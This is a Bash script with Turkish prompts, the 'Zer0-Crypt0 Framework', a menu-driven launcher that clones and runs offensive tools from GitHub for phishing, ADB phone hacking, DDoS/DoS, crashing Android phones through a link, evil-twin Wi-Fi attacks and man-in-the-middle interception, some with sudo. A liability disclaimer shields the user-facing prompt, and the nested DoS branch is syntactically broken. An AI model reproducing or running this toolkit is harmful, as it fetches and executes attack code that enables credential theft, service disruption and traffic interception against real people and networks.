#!/bin/bash

# Orange: echo -e "\e[33m"
# Red: echo -e "\e[91m"
# Green: echo -e "\e[92m"
# Yellow: echo -e "\e[93mYellow"
# Purple: echo -e "\e[95mPurple"
# Black: echo -e "\e[30m "
# Blue: echo -e "\e[34m"
# White: echo -e "\e[97m"

# Veriyon
version="v1.0" 

# Gereksinimler
clear                      
apt-get update                          
apt-get install python      
apt-get install python2  
apt-get install php 
apt-get install adb
pip3 install requests
clear

# UYARI! (Kabul etme zorunlu)
echo -e "\e[91m{<--------------------- !!! ---------------------->}"
echo -e "\e[91mUYARI: Lütfen bu aracı kullanıcılar üzerinde ya da."
echo -e "\e[91msunucular üzerinde denemeyiniz."
echo -e "\e[91mEğer bu uyarıya evet derseniz, sorumluluk bize ait değildir."
echo -e "\e[91m{<--------------------- !!! ---------------------->}"
read -p "Evet sorumluluk alıyorum VEYA Hayır sorumluluk almıyorum: " okno

if [[ $okno == "evet"  ||  $okno == "Evet"  ||  $okno == "E"  || $okno == "e" ]]; then
    echo -e "\e[92m <----------------------------------->"
    echo -e "<----------- \e[33m <{-Hoş Geldiniz-}> ----------->"
    echo -e "\e[92m <----------------------------------->"
    sleep 2.0
    clear

else {
    echo "Iyi günler..."
    exit 1
}
fi
sleep 2.0 
clear


# Zer0-Crypt0 Framework 
echo -e "\e[91m████████╗     ██████╗"
echo -e "\e[91m     ██╝ ═══ ██╔════╝"
echo -e "\e[91m   ██╝   ███ ██║     "
echo -e "\e[91m ██╝         ██║     "
echo -e "\e[91m████████╝    ╚███████ \e[34m$version"

echo -e "      \e[92m Framework}\e"
                                                     # Takip eder misin?
echo -e "\e[30m                           > Tarafından: \e[91m Zer0-Crypt0\e[91m <\e[91m"
echo -e "\e[30m                           > Instagram: \e[93m zer0crypt0\e[91m <\e[93m"

# Seçenekler
echo -e "\e[97m[ 1.0 ]: Oltalama(Phishing) Saldırısı"
echo -e "\e[97m[ 2.0 ]: Android/IOS Telefon Hack(ADB ile)"
echo -e "\e[97m[ 3.0 ]: DDoS / DoS Saldırısı"
echo -e "\e[97m[ 4.0 ]: Link ile Telefon Çökertme(Android)"
echo -e "\e[97m[ 5.0 ]: Şeytan Ikizi(Evil-Twin) Saldırısı"
echo -e "\e[97m[ 6.0 ]: Ortadaki Adam(MITM) Saldırısı"
echo -e "\e[97m[ 7.0 ]: IP Adresi Sorgulama(IP Query)(Kendi Aracım :)"
echo -e "\e[97m[ 8.0 ]: Çık"




read -p "Lütfen bir seçenek seçiniz: " zc
echo "Seçilen seçenek -> [ $zc ] Lütfen bekleyin"
sleep 2.0
clear

if [ $zc -eq 1 ]; then
    git clone git://github.com/htr-tech/zphisher.git
    cd zphisher
    bash zphisher.sh
    exit

elif [ $zc -eq 2 ]; then
    echo -e "\e[93mUYARI: CiLocks aracındaki tüm gereksinimler yüklenemedi."
    echo -e "\e[93mBu durumdan dolayı \e[92mhttps://github.com/tegal1337/CiLocks.git sayfasına gidip"
    echo -e "\e[33mAltta yazan gereksinimleri yükleyebilirsiniz."
    echo -e "\e[91mYüklenmeme Sebebi: Hepsini bir anda yüklerse bu yazılan kod bazı hatalar, "
    echo -e "\e[91mçalışmayan kod satırları ve Github bağlantısı sorunu oluşuyor"
    cd $HOME
    git clone https://github.com/tegal1337/CiLocks.git
    cd CiLocks
    chmod +x cilocks
    sudo ./cilocks
    exit

elif    [ $zc -eq 3 ]; then
    echo "[0.0] Prefeyyonel araç kullan(DDoS Attack)"
    echo "-- {YA DA} --"
    echo "[9.9] Benim yaptığım aracı kullan(DoS Attack)"   
    read -p "Lütfen bir seçenek seçiniz: " cz

    elif [ $cz -eq 0 ]; then
        echo "Tamam, Lütfen bekleyin prefesyonel araç yükleniyor..."
        git clone https://github.com/palahsu/DDoS-Ripper.git
        cd DDoS-Ripper
        python3 DRipper.py
        exit


    elif [ $cz -eq 9 ]; then
        echo "Tamam, Lütfen bekleyin kendi aracım yükleniyor..."
        git clone https://github.com/ZCTools/Simple-Dos-Attack
        cd Simple-Dos-Attack
        python3 Dos.py
        exit

elif [ $zc -eq 4 ]; then
    git clone https://github.com/noob-hackers/infect.git
    cd infect
    bash infect.sh
    exit

elif [ $zc -eq 5 ];then
    git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
    cd airgeddon
    sudo bash airgeddon.sh
    exit

elif [ $zc -eq 6 ];then
    apt-get update
    apt-get install bettercap
    sudo ./bettercap
    exit

elif [ $zc -eq 7 ]; then
    git clone https://github.com/ZCTools/IP_Query_Tool.git
    cd IP_Query_Tool
    python3 ipQuery.py
    exit

elif [ $zc -eq 8 ]; then
    echo "Hoşça kalın, iyi günler..."
    exit

fi